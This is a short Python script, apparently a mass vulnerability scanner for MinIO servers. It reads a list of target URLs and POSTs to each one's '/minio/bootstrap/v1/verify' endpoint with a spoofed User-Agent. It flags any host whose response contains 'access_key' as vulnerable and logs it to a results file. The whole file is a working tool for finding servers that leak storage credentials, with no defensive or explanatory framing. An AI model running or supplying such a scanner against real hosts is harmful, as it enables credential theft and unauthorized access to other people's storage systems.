import requests

proxies = {
  'http': 'http://127.0.0.1:8080',
  'https': 'https://127.0.0.1:8080',
}

url = open("./url.txt")
url1 = url.readlines()


UA = {
           "User-Agent":"Mozilla/6666.0 (Windows NT 7.0; Win32; x32; rv:107.0) Gecko/20100101 Firefox/107.0"
    }


for i in range(len(url1)):
    try:
        aa = (url1[i]).strip()
        aa1 = aa + "/minio/bootstrap/v1/verify"
        re = requests.post(url=aa1,headers=UA,timeout=5,proxies=proxies)
        if "access_key" in re.text:
            print(aa1+'   存在漏洞')
            re_true = open("./ok.txt",'a+')
            re_true.writelines((url1[i]).strip()+'\n')
            re_true.close()
        else:
            print(aa1+"   不存在漏洞")
    except:
        print(aa1+ '  无法访问')


